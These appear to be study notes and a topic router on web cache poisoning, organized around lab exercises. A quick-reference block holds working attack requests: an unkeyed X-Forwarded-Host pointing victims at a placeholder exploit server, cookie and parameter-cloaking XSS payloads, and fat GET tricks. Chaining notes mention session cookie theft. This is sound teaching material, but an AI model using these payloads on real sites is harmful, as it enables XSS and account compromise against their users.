# Web cache poisoning — topic overview & router

Cache poisoning forces a shared cache to store a malicious response and serve it to other users. The attacker finds inputs that affect the response but are excluded from the cache key ("unkeyed inputs"), injects a payload via those inputs, and waits for the cache to serve the poisoned entry to victims. Impact ranges from stored XSS to open redirect to full account compromise.

## 30-second quick reference

```
# Discover unkeyed headers (Param Miner)
Right-click request → Guess headers → note "X-Forwarded-Host", "X-Host", etc.

# Basic unkeyed header poison
GET /?cb=1 HTTP/1.1
X-Forwarded-Host: EXPLOIT-SERVER
→ response reflects exploit server in <script src="//EXPLOIT-SERVER/resources/js/tracking.js">
→ host tracking.js = alert(document.cookie)
→ replay until X-Cache: hit → remove cb param → re-poison → victim gets XSS

# Unkeyed cookie
Cookie: fehost=someString"-alert(1)-"someString

# Fat GET (body overrides query param, only query is keyed)
GET /js/geolocate.js?callback=setCountryCookie
callback=alert(1)                  ← body param wins in response, excluded from cache key

# Parameter cloaking (semicolon injection)
GET /js/geolocate.js?callback=setCountryCookie;callback=alert(1)

# URL normalization XSS
GET /random</p><script>alert(1)</script><p>foo
→ cache stores normalized path → browser decodes → payload fires
```

## Decision map

| Observation | Sub-technique | Attack |
|---|---|---|
| Response reflects Host/X-Forwarded-Host | [Unkeyed-inputs](Unkeyed-inputs/) | inject exploit server, poison tracking.js import |
| Cookie value reflected in JS | [Unkeyed-inputs](Unkeyed-inputs/) | XSS via unkeyed cookie |
| Redirect on non-HTTPS scheme header | [Unkeyed-inputs](Unkeyed-inputs/) | chain X-Forwarded-Scheme + X-Forwarded-Host |
| Unknown header discovered by Param Miner | [Unkeyed-inputs](Unkeyed-inputs/) | targeted poisoning with Vary: User-Agent |
| Query string not in cache key | [Unkeyed-inputs](Unkeyed-inputs/) | inject XSS in query param |
| Specific param unkeyed (utm_content etc.) | [Parameter-cloaking-and-fat-GET](Parameter-cloaking-and-fat-GET/) | semicolon cloaking or direct unkeyed param XSS |
| GET request accepts body param | [Parameter-cloaking-and-fat-GET](Parameter-cloaking-and-fat-GET/) | fat GET — body overrides keyed query param |
| Path reflects in error response | [Parameter-cloaking-and-fat-GET](Parameter-cloaking-and-fat-GET/) | URL normalization: poison with decoded payload |
| JS fetches JSON from dynamic host | [DOM-and-advanced](DOM-and-advanced/) | DOM XSS via poisoned data source host |
| Multiple cache quirks present | [DOM-and-advanced](DOM-and-advanced/) | combine techniques (X-Forwarded-Host + X-Original-URL) |
| Cache key injection possible | [DOM-and-advanced](DOM-and-advanced/) | Pragma: x-get-cache-key + header injection chain |
| Internal + external two-layer cache | [DOM-and-advanced](DOM-and-advanced/) | poison internal cache independently of external |

## Sub-technique folders
- `Unkeyed-inputs/` — unkeyed headers (X-Forwarded-Host, X-Host), unkeyed cookies, unkeyed query strings (6 labs)
- `Parameter-cloaking-and-fat-GET/` — semicolon cloaking, fat GET body override, URL normalization (3 labs)
- `DOM-and-advanced/` — DOM XSS via poisoned data, combined techniques, cache key injection, internal cache (4 labs)

## Root cause
- Caches key responses on a subset of request attributes (typically method + path + Host + select headers/cookies). Any input that influences the response but is absent from the cache key can be poisoned.
- Application developers assume users control only keyed inputs; cache infrastructure often strips or normalizes inputs before forwarding them differently than the app expects.

## Find it
1. Run Param Miner (Guess headers) on every cacheable GET request — look for reflected headers not in cache key.
2. Check `X-Cache`, `Age`, `CF-Cache-Status` response headers — confirm caching behavior.
3. Add a cache buster (?cb=<random>) to isolate your test from live cache.
4. Compare GET vs POST for same endpoint — does body param shadow query param?
5. Try fat GET: add body to GET request — if response changes, body is unkeyed.
6. Test cookies: change cookie value → observe if reflected in response and cached.
7. Param Miner "Rails parameter cloaking scan" for semicolon-separated param injection.

## Chaining
- Cache poisoning XSS → session cookie theft → [Authentication](../Authentication/)
- Poisoned redirect → phishing / credential capture
- DOM XSS via poisoned data source → same impact as [XSS/DOM-based](../XSS/DOM-based/)
- Cache key injection → header injection → [HTTP-request-smuggling](../HTTP-request-smuggling/)

## Tools
- **Param Miner** (BApp) — discover unkeyed headers/params
- **Burp Repeater** — manual cache buster testing, replay until X-Cache: hit
- **Exploit server** — host malicious JS/JSON files for import poisoning

## References
- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
